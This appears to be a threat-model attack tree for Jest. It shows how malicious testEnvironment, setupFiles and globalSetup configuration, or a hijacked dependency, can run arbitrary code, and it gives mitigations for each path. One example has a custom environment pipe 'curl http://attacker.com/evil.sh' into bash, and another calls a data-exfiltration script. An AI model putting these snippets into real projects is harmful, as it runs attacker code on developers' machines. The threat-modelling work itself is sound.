## Attack Tree Path: [1. Malicious Jest Configuration (Critical Node)](./attack_tree_paths/1__malicious_jest_configuration__critical_node_.md)

*   **Description:** This attack vector involves manipulating Jest's configuration file (e.g., `jest.config.js`, `package.json`) to inject malicious code. Jest's configuration offers powerful options that, if abused, can lead to arbitrary code execution.
*   **Likelihood:** Medium (Requires access to modify config files)
*   **Impact:** High to Very High (Full code execution)
*   **Effort:** Low to Medium (Depends on access controls)
*   **Skill Level:** Intermediate
*   **Detection Difficulty:** Medium (Requires config review and monitoring)

## Attack Tree Path: [1.a. Abuse `testEnvironment` (Critical Node) ===> `Custom Env` (Critical Node)](./attack_tree_paths/1_a__abuse__testenvironment___critical_node__===__custom_env___critical_node_.md)

*   **Description:** The `testEnvironment` option specifies the environment in which tests run.  The default `node` environment is relatively safe, but an attacker can specify a custom environment (a JavaScript file) that executes arbitrary code when Jest initializes.
*   **Attack Vector:** The attacker modifies the `testEnvironment` option in the Jest configuration to point to a malicious JavaScript file they control. This file contains arbitrary code that will be executed when Jest starts.
*   **Example:**
    ```javascript
    // jest.config.js
    module.exports = {
      testEnvironment: './malicious-env.js',
    };

    // malicious-env.js
    module.exports = class MaliciousEnvironment {
      constructor(config, context) {
        // Execute arbitrary code here
        require('child_process').execSync('curl http://attacker.com/evil.sh | bash');
      }
    };
    ```
*   **Mitigation:**
    *   Strictly control and audit custom test environments.
    *   Avoid using custom test environments unless absolutely necessary.
    *   Use a more secure environment like `jsdom` if a full Node.js environment isn't required.
    *   Implement mandatory code reviews for all changes to Jest configuration files.
    *   Use a linter to enforce secure coding practices.

## Attack Tree Path: [1.b. Abuse `setupFiles` (Critical Node) ===> `Run Arbitrary Scripts/Modules` (Critical Node)](./attack_tree_paths/1_b__abuse__setupfiles___critical_node__===__run_arbitrary_scriptsmodules___critical_node_.md)

*   **Description:** The `setupFiles` option allows specifying an array of files that will be executed *before* each test file runs. An attacker can inject a path to a malicious script here.
*   **Attack Vector:** The attacker adds a path to a malicious script to the `setupFiles` array in the Jest configuration.
*   **Example:**
    ```javascript
    // jest.config.js
    module.exports = {
      setupFiles: ['./malicious-setup.js'],
    };

    // malicious-setup.js
    require('child_process').execSync('exfiltrate-data.sh');
    ```
*   **Mitigation:**
    *   Carefully review and validate all files listed in `setupFiles`.
    *   Avoid using relative paths that could be manipulated.
    *   Use a linter to enforce secure coding practices in these setup files.
    *   Implement mandatory code reviews for all changes to Jest configuration files.

## Attack Tree Path: [1.c. Abuse `globalSetup` (Critical Node) ===> `Run Arbitrary Scripts/Modules` (Critical Node)](./attack_tree_paths/1_c__abuse__globalsetup___critical_node__===__run_arbitrary_scriptsmodules___critical_node_.md)

*   **Description:** The `globalSetup` option allows specifying a single file that will be executed *once* before all tests run. This is even more dangerous than `setupFiles` as it executes before any test context is established.
*   **Attack Vector:** The attacker sets the `globalSetup` option in the Jest configuration to point to a malicious script.
*   **Example:**
    ```javascript
    // jest.config.js
    module.exports = {
      globalSetup: './malicious-global-setup.js',
    };

    // malicious-global-setup.js
    require('fs').writeFileSync('/tmp/pwned', 'You have been compromised!');
    ```
*   **Mitigation:**
    *   Same as `setupFiles`, but with even greater scrutiny.
    *   Minimize the use of `globalSetup` if possible.
    *   Implement mandatory code reviews for all changes to Jest configuration files.

## Attack Tree Path: [2. Exploit Jest Vulnerability ===> Dependency Hijack (Critical Node) ===> Install Malicious Package (Critical Node)](./attack_tree_paths/2__exploit_jest_vulnerability_===_dependency_hijack__critical_node__===_install_malicious_package__c_ecdcc04b.md)

*   **Description:** This attack vector involves exploiting a vulnerability in one of Jest's dependencies. If a dependency is compromised (e.g., through a supply chain attack on npm), an attacker could inject malicious code that Jest would then execute.
*   **Likelihood:** Low (Requires compromising a Jest dependency)
*   **Impact:** Very High (Full code execution through the compromised dependency)
*   **Effort:** High to Very High (Requires compromising a package on npm or a private registry)
*   **Skill Level:** Advanced to Expert
*   **Detection Difficulty:** Hard (Requires monitoring dependency updates and vulnerability scans)
*   **Attack Vector:**
    1.  An attacker compromises a package that Jest depends on (directly or indirectly). This could be done by:
        *   Taking over an existing maintainer's account.
        *   Submitting a malicious pull request that gets merged.
        *   Exploiting a vulnerability in the package registry (e.g., npm).
    2.  The attacker publishes a new version of the compromised package containing malicious code.
    3.  When a developer updates their dependencies (or installs Jest for the first time), the malicious package is installed.
    4.  When Jest runs, it executes the malicious code within the compromised dependency.
*   **Mitigation:**
    *   Use a dependency management tool with vulnerability scanning (e.g., `npm audit`, `yarn audit`, Snyk, Dependabot).
    *   Pin dependency versions to prevent unexpected updates (using a lockfile).
    *   Consider using a private package registry to control which packages are used.
    *   Regularly audit dependencies for known vulnerabilities.
    *   Implement a software composition analysis (SCA) tool.
